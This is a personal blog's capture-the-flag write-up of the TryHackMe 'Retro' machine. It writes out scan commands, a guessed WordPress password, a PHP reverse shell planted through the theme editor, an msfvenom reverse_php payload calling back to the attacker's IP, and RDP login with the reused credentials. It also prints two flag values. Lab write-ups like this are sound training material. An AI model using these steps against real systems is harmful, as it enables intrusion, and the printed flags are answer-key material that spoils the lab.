<!DOCTYPE html>
<html lang="en-us">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Retro Write-up | TryHackMe | Utkarsh M</title>
    <link rel="stylesheet" href="/css/style.css" />
    <link rel="stylesheet" href="/css/fonts.css" />
    
  </head>

  <body>
    <header class="site-title-main">
      Utkarsh M
    </header>
    <nav>
    <ul class="menu">
      
      <li><a href="/">Home</a></li>
      
      <li><a href="/post/">Posts</a></li>
      
      <li><a href="/categories/">Categories</a></li>
      
      <li><a href="/about/">About</a></li>
      
    </ul>
    <hr/>
    </nav>

<div class="post-container">
  <div class="post-date">2022/06/15</div>
  <h1 class="post-title">Retro Write-up | TryHackMe</h1>
</div>

<main>
<p><img src="/assets/img/thm/retro/head.img" alt="screenshot"></p>
<p>We can see that a webserver is hosted on the machine.</p>
<p>While waiting for the recommended time, :) let’s run a gobuster directory scan:</p>
<pre><code class="language-bash">gobuster dir --wordlist=/usr/share/dict/directory-list-2.3-medium.txt --url=http://10.10.36.56/
</code></pre>
<p>we get /retro as one of the results. It leads to a webpage. :)
lets run a threader3000 scan on the background.</p>
<pre><code class="language-bash">python threader3000
10.10.36.56
</code></pre>
<p><img src="/assets/img/thm/retro/1.png" alt="screenshot"></p>
<p>Running the suggested nmap scan with curent gobuster scan results:</p>
<p><img src="/assets/img/thm/retro/2.png" alt="screenshot"></p>
<p>hmm :P So the site is a wordpress site. From the posts we can see that wade is user of the wordpress. Lets check out for different pages.</p>
<p><img src="/assets/img/thm/retro/3.png" alt="screenshot"></p>
<p>parzival ends up working as the password. xD</p>
<p>Hmm, :) we can access Appearance-&gt;Theme editor. ;) Let’s use a php-reverse-shell. I am going to change 404.php with the reverse shell code. :)</p>
<p>Setting up a netcat listener:</p>
<pre><code class="language-bash">nc -lvnp 1234
</code></pre>
<p>The usual php-reverse-shell that I use was giving issues so I generated a new one using msfvenom:</p>
<pre><code class="language-bash">msfvenom -p php/reverse_php LHOST=10.17.47.158 LPORT=4444 -f raw -o mew.php
</code></pre>
<p>After setting up a netcat listener for the same. :)</p>
<p>:) we finally get access to the system but as user: iusr</p>
<p><img src="/assets/img/thm/retro/4.png" alt="screenshot"></p>
<p>The shell just keeps on dying. :-;</p>
<p>Hmm, :) Trying to connect to the server via rdp using the wade’s wordpress credential works</p>
<pre><code class="language-bash">xfreerdp /u:wade /p:parzival /cert:ignore /v:10.10.36.56 /workarea
</code></pre>
<p><img src="/assets/img/thm/retro/5.png" alt="screenshot"></p>
<p>First Flag on desktop:</p>
<pre><code>3b99fbdc6d430bfb51c72c651a261927
</code></pre>
<p>There is a bookmark in chrome about a vulnerability: <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-1388">CVE-2019–1388</a></p>
<p>:) Looking at this Video regarding the vulnerability:</p>
<iframe width="560" height="315" src="https://www.youtube.com/embed/3BQKpPNlTSo" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
<p>the file in the recycle bin matches the one in the video, recovering it and following the procedure to get system previleges, we can get our final flag. :)</p>
<pre><code>7958b569565d7bd88d10c6f22d1c4063
</code></pre>

</main>

  <footer>
  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css">
<script src="//cdn.jsdelivr.net/npm/@xiee/utils/js/math-code.min.js" defer></script>
<script src="//cdn.jsdelivr.net/npm/katex/dist/katex.min.js" defer></script>
<script src="//cdn.jsdelivr.net/npm/katex/dist/contrib/auto-render.min.js" defer></script>
<script src="//cdn.jsdelivr.net/npm/@xiee/utils/js/render-katex.js" defer></script>

<script src="//cdn.jsdelivr.net/npm/@xiee/utils/js/center-img.min.js" defer></script>

  
  <hr/>
  © <a href="https://utkar5hm.github.io">Utkarsh M</a> 2025 &ndash; 2025 | <a href="https://github.com/Utkar5hM">Github</a> | <a href="https://www.linkedin.com/in/utkar5hm/">Linkedin</a>
  
  </footer>
  </body>
</html>

